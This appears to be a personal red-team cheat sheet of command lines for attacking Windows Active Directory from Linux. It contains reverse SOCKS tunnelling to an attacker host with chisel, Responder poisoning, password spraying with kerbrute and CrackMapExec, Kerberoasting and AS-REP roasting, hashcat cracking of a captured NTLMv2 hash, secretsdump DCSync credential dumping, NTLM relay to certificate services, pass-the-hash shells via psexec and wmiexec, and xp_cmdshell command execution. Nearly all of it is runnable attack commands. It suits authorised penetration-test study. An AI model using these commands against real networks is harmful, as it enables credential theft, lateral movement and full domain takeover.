#team/red #os/linux #type/pentest

# TOC <!-- omit in toc -->
- [Password List](#password-list)
  - [SecLists](#seclists)
- [Fuzzing](#fuzzing)
  - [ffuf](#ffuf)
- [Tunneling](#tunneling)
  - [chisel](#chisel)
- [Network Utility](#network-utility)
  - [nc](#nc)
  - [socat](#socat)
  - [netstat](#netstat)
  - [ss](#ss)
- [File Transfer](#file-transfer)
  - [UDP](#udp)
    - [TFTP](#tftp)
  - [SSH](#ssh)
    - [scp](#scp)
- [Crack Hash](#crack-hash)
  - [Hashcat](#hashcat)
  - [John](#john)
- [Remote Access](#remote-access)
  - [RDP](#rdp)
    - [xfreerdp](#xfreerdp)
    - [Remmina](#remmina)
  - [SSH](#ssh-1)
    - [ssh](#ssh-2)
  - [WinRM](#winrm)
    - [Evil-WinRM](#evil-winrm)
- [Enumeration](#enumeration)
  - [tcpdump](#tcpdump)
  - [Responder](#responder)
  - [fping](#fping)
  - [nmap](#nmap)
  - [kerbrute](#kerbrute)
  - [ldapsearch](#ldapsearch)
  - [windapsearch](#windapsearch)
  - [SMBMap](#smbmap)
  - [BloodHound](#bloodhound)
    - [BloodHound.py](#bloodhoundpy)
- [Utility](#utility)
  - [CrackMapExec](#crackmapexec)
  - [Samba](#samba)
    - [nmblookup](#nmblookup)
    - [nbtstat](#nbtstat)
    - [net](#net)
    - [rpcclient](#rpcclient)
    - [smbclient](#smbclient)
    - [enum4linux](#enum4linux)
    - [enum4linux-ng](#enum4linux-ng)
  - [impacket](#impacket)
    - [GetNPUsers.py](#getnpuserspy)
    - [GetUserSPNs.py](#getuserspnspy)
    - [ntlmrelayx.py](#ntlmrelayxpy)
    - [smbserver.py](#smbserverpy)
    - [secretsdump.py](#secretsdumppy)
    - [psexec.py](#psexecpy)
    - [wmiexec.py](#wmiexecpy)
    - [mssqlclient.py](#mssqlclientpy)
    - [gettgtpkinit.py](#gettgtpkinitpy)
    - [getnthash.py](#getnthashpy)

# Password List
## SecLists
```
$ find /usr/share/seclists -type f -name "*.txt" | xargs wc -l 2>/dev/null | sort -n | grep -i pass

```

# Fuzzing
## ffuf  
```zsh
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
```

# Tunneling 
## chisel
```zsh
# Tunneling - Linux <-> Windows
$ chisel_1.9.1_linux_amd64 server -p 8000 --reverse
PS> c:\chisel client XXX.XXX.XXX.XXX:8000 R:5002:socks
# sudo vim /etc/proxychains4.conf
## socks5 	127.0.0.1 5000
# proxychains4 psexec.py HOGE.COM/TestUser:TestPassword@XXX.XXX.XXX.XXX

# Tunneling - Linux <-> Linux
## On Attacker Host (My Host)
$ sudo vim /etc/proxychains4.conf
# socks5	127.0.0.1 8000
$
### File Transfer: Local -> Remote
$ scp ./chisel_1.10.1_linux_amd64 TestUser@<Target Host IP>:/home/TestUser/chisel_1.10.1_linux_amd64
$ ./chisel_1.10.1_linux_amd64 server -p 8001 --reverse
## On Target Host
$ ./chisel_1.10.1_linux_amd64 client <Attacker Host IP>3:8001 R:8000:socks
## On Attacker Host (My Host)
$ proxychains4 xfreerdp3 /v:<Target Host IP> /d:hoge.com /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
```

# Network Utility
## nc  

```zsh
# LDAP Pass-back Attacks
$ sudo nc -lvnp LPORT
$ nc -lvp 389
```
## socat
```zsh
$ socat TCP4-LISTEN:13514,fork TCP4:TestTargetHost.HOGE.com:3389
```

## netstat  
```zsh
$ netstat -tuln
```

## ss  
```zsh
$ ss -tuln
$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
-t: Show TCP connections.
-u: Show UDP connections.
-l: Show only listening sockets.
-n: Show numerical addresses instead of resolving hostnames.
-4: IPv4
```

# File Transfer
## UDP
### TFTP
```zsh
$ tftp -i XXX.XXX.XXX.XXX GET "\Tmp\x64{8A98E259-D569-5C1B-A098-986F5B5736FF}.bcd" conf.bcd
$ tftp -i XXX.XXX.XXX.XXX GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

## SSH
### scp
```zsh
$ scp TestUser@HOGE.com:C:/Users/TestUser/Documents/20240518062907_BloodHound.zip .

# Remote -> Local
s scp user@<remote IP>:/Users/TestUser/hoge.txt ./local/

# Local -> Remote
$ scp ./local user@<remote IP>:/Users/TestUser/hoge.txt
```


# Crack Hash
## Hashcat
Misc
[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
```zsh
$ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt
$ hashcat -m 5600 TestUser_ntlmv2 /usr/share/wordlists/rockyou.txt
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
## e.g. weak password : may take 5 minutes to crack
## e.g. a little long but weak password: may take 25 minutes to crack
$ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
$ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 -a 0 ./GetUserSPNs-py_hashcat.txt ./TestPasswordList.txt
# AS-REP roast
$ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
# DCSync
$ hashcat -m 1000 outout_mimikatz_dcsync_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
## John
Misc

# Remote Access
## RDP
### xfreerdp
```zsh
$ xfreerdp -h
$ xfreerdp3 -h

$ xfreerdp /v:XXX.XXX.XXX.XXX /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:TestPassword /dynamic-resolution
$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:'P@$$W0rd' /dynamic-resolution
# bad
## $ has a special meaning
## $ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:P@$$W0rd /dynamic-resolution
```
`/dynamic-resolution` option may not work well.

### Remmina
```zsh
$ remmina -c rdp://TestUser@XXX.XXX.XXX.XXX
```

## SSH
### ssh
```zsh
$ ssh TestUser@XXX.XXX.XXX.XXX
$ ssh HOGE.com\\TestUser@TestHost.HOGE.com
$ ssh TestUser@XXX.XXX.XXX.XXX -R 8888:TestHost.HOGE.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```


## WinRM
### Evil-WinRM
https://github.com/Hackplayers/evil-winrm
```zsh
$ evil-winrm -i XXX.XXX.XXX.XXX -u TestUser
$ evil-winrm -i HOGE.com -u TestUser -H TestNTHash
```


# Enumeration
## tcpdump  
Initial Enumeration  
```zsh
$ sudo tcpdump -i ens224
```

## Responder  
Initial Enumeration  
Protocol: LLMNR, NBT-NS, and MDNS  
```zsh
$ sudo responder -I ens224 -A
$ sudo responder -I ens224
```
/usr/share/responder/logs
/usr/share/responder/Responder.conf 

## fping  
Protocol: ICMP  
```zsh
$ fping -asgq 172.16.5.0/23
```

## nmap
```zsh
$ sudo nmap XXX.XXX.XXX.XXX -p49555 -sV
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p-
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p8080
$ sudo nmap -sV -sC -p139,445 172.16.5.5
$ sudo nmap -sV -sC -p 0-10000 172.16.5.5
$ sudo nmap -A -p- 172.16.5.5
$ sudo nmap -sV -p- 172.16.5.130
$ sudo nmap -sV -p- 172.16.5.225
$ sudo nmap -v -A -iL hosts.txt -oN /home/TestUser/Documents/host-enum
```
-A: Aggressive scan. ref.https://nmap.org/book/man-misc-options.html

## kerbrute
Enumerating Users
Protocol: Kerberos
```zsh
$ kerbrute userenum -d HOGE.local --dc 172.16.0.10 mylist.txt -o valid_ad_users
# Password Spraying - Making a Target User List - Without a valid domain account - Kerberos Pre-Authentication 
## Pre-setup
## $ sudo echo 1721.16.0.10 HOGE.com >> /etc/hosts
$ kerbrute userenum --dc HOGE.com -d HOGE.com ./userlist.txt
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@hoge\.com//' > valid_users.txt

# Password Spraying - Authentication Attempt - With a valid username - SMB
$ kerbrute passwordspray -d hoge.local --dc 172.17.0.1 valid_users.txt TestPassword
```

## ldapsearch
Protocol: LDAP  
Enumerating the Password Policy, LDAP Anonymous Bind  
```zsh
$ ldapsearch -h 172.16.0.2 -x -b "DC=HOGE,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
# Password Spraying - Making a Target User List - Without a valid domain account - LDAP anonymous bind
$ ldapsearch -h 172.16.0.2 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

## windapsearch
Protocol: LDAP  
https://github.com/ropnop/windapsearch  
```zsh
$ windapsearch.py -h
# Password Spraying - Making a Target User List - Without a valid domain account - LDAP anonymous bind
$ windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u "" -U
# Generic - Enumerating 'Domain Admins' group members - Without a valid domain account - LDAP
$ windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u TestUser@hoge.local -p TestPassword --da
# Generic - Enumerating Privileged Users - Without a valid domain account - LDAP
$ windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u TestSpnAccountUser -p TestSpnAccountPassword -PU
```

## SMBMap
Protocol: SMB  
https://github.com/ShawnDEvans/smbmap  
```zsh
$ smbmap -h

# Generic - Enumerating Share - With a valid domain account - SMB
$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX -R 'Test Shares' --dir-only

# Generic - Enumerating Share and dowload a file on a share - With a valid domain account - SMB
$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX -R 'Test Shares' -A test.config
## -> $ less 'XXX.XXX.XXX.XXX-Test\ Shares_test.config'
```

## BloodHound
### BloodHound.py
```zsh
$ bloodhound-python -h
# Generic - Enumeratin user sessions, users and groups, object properties, ACLS, or select all to gather as much data as possible - BloodHound
$ sudo bloodhound-python -u 'TestService' -p 'TestServicePasssord' -ns XXX.XXX.XXX.XXX -d hoge.local -c all
$ sudo bloodhound-python -u 'TestUser' -p 'TestPassword' -ns XXX.XXX.XXX.XXX -d hoge.local -c all
$ ls
$ zip -r hoge_bh.zip *.json
$ sudo neo4j start
```

# Utility
## CrackMapExec
Enumeration, Lateral Movement
Protocol: SMB, LDAP, WinRM, RDP, Kerberos, MSSQL, FTP, SSH, HTTP(S)
have acquired a foothold in the domain
```zsh
$ crackmapexec -h
$ crackmapexec smb -h
$ crackmapexec winrm -h
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --pass-pol
# Password Spraying - Making a Target User List - Without a valid domain account - SMB NULL Session to Pull User List
$ crackmapexec smb XXX.XXX.XXX.XXX --users

# Generic - Authentication Attempt - With a valid username - SMB
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword

# Password Spraying - Making a Target User List - With a valid domain account - SMB
# or Generic - Enumerating Domain User - With a valid domain account - SMB
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --users
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --users > result_CME-smb.txt
## Make UserList and Delete Color code
$ cat result_CME-smb.txt | awk -F " " '{printf("%s\n", $5)}' | sed 's/\x1b\[[0-9;]*m//g' | cut -d '\'-f2 | tee userlist_CME-smb.txt
### ' ... markdown color adjustment
## Merge UserList
# -> $ cat userlist_CME-ldap.txt userlist_CME-smb.txt | sort | uniq | tee userlist.txt

# Generic - Enumerating Domain User - With a valid domain account - LDAP
$ crackmapexec ldap XXX.XXX.XXX.XXX -u TestUser -p TestPassword --users > result_CME-ldap.txt
## Make UserList and Delete Color code
$ cat result_CME-ldap.txt | awk -F " " '{printf("%s\n", $5)}' | sed 's/\x1b\[[0-9;]*m//g' | tee userlist_CME-ldap.txt
## Merge UserList
# -> $ cat userlist_CME-ldap.txt userlist_CME-smb.txt | sort | uniq | tee userlist.txt

# Generic - Enumerating Domain Group - With a valid domain account - SMB
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups

# Generic - Enumerating Currently Logged On Users - With a valid domain account - SMB
$ rackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --loggedon-users

# Generic - Enumerating Share - With a valid domain account - SMB
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --shares
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword  -M spider_plus --share 'Test Shares'
$ crackmapexec smb XXX.XXX.XXX.XXX/24 -u TestUser -p TestPassword --shares
$ crackmapexec smb XXX.XXX.XXX.XXX/24 -u TestUser -p TestPassword -M spider_plus --shares

# Password Spraying - Making a Target User List - With NT hash for a local administrator account password - SMB
$ crackmapexec smb --local-auth 172.17.0.1/23 -u administrator -H TestNtHash | grep +
$ head -n 10 /tmp/cme_spider_plus/XXX.XXX.XXX.XXX.json
$ set +H

# Password Spraying - Authentication Attempt - With a valid username - SMB
$ crackmapexec smb 172.17.0.2 -u valid_users.txt -p TestPasseord | grep +

$ crackmapexec smb --local-auth XXX.XXX.XXX.XXX/23 -u administrator -H TestNTLMhash | grep +
$ crackmapexec smb XXX.XXX.XXX.XXX -u administrator -H TestNTLMhash
```

## Samba
### nmblookup
Protocol: 137/UDP

### nbtstat
Protocol: 137/UDP

### net
Protocol: 139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535

### rpcclient
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration  
https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/  
Protocol: DCE/RPC over SMB ... 135/TCP
```zsh
$ rpcclient -U "" -N XXX.XXX.XXX.XXX
rpcclient $> querydominfo
rpcclient $> getdompwinfo
# Password Spraying - Making a Target User List - Without a valid domain account - SMB NULL Session to Pull User List
# Generic - Enumerating User - Having SMB NULL Session / With a valid domain account - RID
rpcclient $> queryuser 0x457
rpcclient $> queryuser (RID(hex))
rpcclient $> enumdomusers
$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
$ grep Intern a.txt
group:[Interns] rid:[0xff0]
$
$ echo $((16#ff0))
4080
# Password Spraying - Authentication Attempt - With a valid username - SMB
$ for u in $(cat valid_users.txt);do rpcclient -U "$u%TestPassword" -c "getusername;quit" 172.17.0.1 | grep Authority; done
```

### smbclient
Protocol: SMB - 445/TCP
```zsh
$ smbclient -U TestUser -N XXX.XXX.XXX.XXX
```

### enum4linux
`enum4linux` is a tool that combines `smbclient`, `rpcclient`, and `nmblookup` to perform SMB enumeration against Windows and Samba systems.
Protocol: SMB(CIFS) - 445/TCP & 139/TCP（NetBIOS over TCP）, NetBIOS- 137/UDP & 138/UDP
```zsh
# sudo echo 172.16.0.10 hoge.com >> /etc/hosts
$ enum4linux -a hoge.com | tee output_enum4linux_a_hoge-com.ans
$ enum4linux -a XXX.XXX.XXX.XXX | tee output_enum4linux_a_ip.ans
$ enum4linux -P XXX.XXX.XXX.XXX
  List
$ enum4linux -U XXX.XXX.XXX.XXX | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### enum4linux-ng
```zsh
$ enum4linux-ng -P 172.16.0.10 -oA my_output
$ cat my_output.json
```

## impacket
### GetNPUsers.py
tag: AS-REP Roast
```zsh
$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt hoge.com/ | tee output_GetNPUsers.ans
$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./output_GetNPUsers.txt hoge.com/
```
### GetUserSPNs.py
```zsh
$ GetUserSPNs.py -h
# Keberoasting - Listing SPN Accounts - In a domain-user context - Kerberos
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo
# Keberoasting - Requesting all TGS Tickets - In a domain-user context - Kerberos
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo -request
# Keberoasting - Requesting all TGS Tickets - With a valid domain user account - Kerberos
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/TestUser:TestPassword -request -outputfile GetUserSPNs-py_hashcat.txt
# Keberoasting - Requesting a Single TGS ticket - In a domain-user context - Kerberos
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo –request-user TestUser
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo –request-user TestUser -outputfile TestUser_tgs
# -> Cracking the Ticket Offline
## $ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt
# -> Testing Authentication
## $ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
### ntlmrelayx.py
```zsh
$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
$ ntlmrelayx.py -debug -smb2support --target http://TestCa.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
```
### smbserver.py
```zsh
$ smbserver.py -smb2support -username TestUser -password TestPassword TestRemoteAppearFolder TestLocalDirectory
```
### secretsdump.py
```zsh
$ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
$ secretsdump.py -just-dc-user TestUser HOGE.com/TestUser:"TestPassword\!"@XXX.XXX.XXX.XXX

# DCSync - Extract NTLM Hashes - With a valid account having rights for DCSync
$ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
## -> $ ls hoge-com_hashes*
## -> $ cat hoge-com_hashes.ntds.cleartext 

$ secretsdump.py -just-dc-user HOGE/administrator "Test-DC1$"@XXX.XXX.XXX.XXX -hashes TestNtHash:TestLmHash
$ secretsdump.py -sam sam.hive -system system.hive LOCAL

$ secretsdump.py -ntds CopiedNtds.dit -system system.hive LOCAL

## -just-dc-ntlm : if we only want NTLM hashes
## -just-dc-user <USERNAME> : to only extract data for a specific user
## -pwd-last-set : to see when each account's password was last changed
## -history : if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client
## -user-status : to check and see if a user is disabled
## -just-dc : one containing NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled
```
### psexec.py
Protocol: SMB
```zsh
# Lateral Movement - Establishing shell - With local administrator privileges - PsExec
$ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX

$ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
```
### wmiexec.py
Protocol: SMB
```zsh
# Lateral Movement - Establishing shell - With local administrator privileges - WMI
$ wmiexec.py hoge.local/TestUser:'TestPassword'@XXX.XXX.XXX.XXX
# pth
$ wmiexec.py -hashes :TestNtHash Administrator@XXX.XXX.XXX.XXX
```
### mssqlclient.py 
- [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
```zsh
$ mssqlclient.py HOGE/TestUser@XXX.XXX.XXX.XXX -windows-auth
SQL> help
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
SQL> xp_cmdshell 'whoami /priv'
SQL> exec xp_cmdshell 'dir C:\Windows'
SQL> EXEC xp_cmdshell 'dir C:\Windows'

# NG:
# xp_cmdshell 'dir C:\Windows'

$ mssqlclient.py HOGE/TestUser:'TestPassword'@XXX.XXX.XXX.XXX
```
### gettgtpkinit.py 
```zsh
$ gettgtpkinit.py HOGE.COM/TestADHost\$ -pfx-base64 TestBase64EncodedText TestDC.ccache
$ export KRB5CCNAME=TestDC.ccache
$ secretsdump.py -just-dc-user HOGE/administrator -k -no-pass "TestADHost$"@TestADHost.HOGE.COM
```
### getnthash.py
```zsh
$ getnthash.py -key TestNtHash HOGE.COM/Test-AD-Host$
```
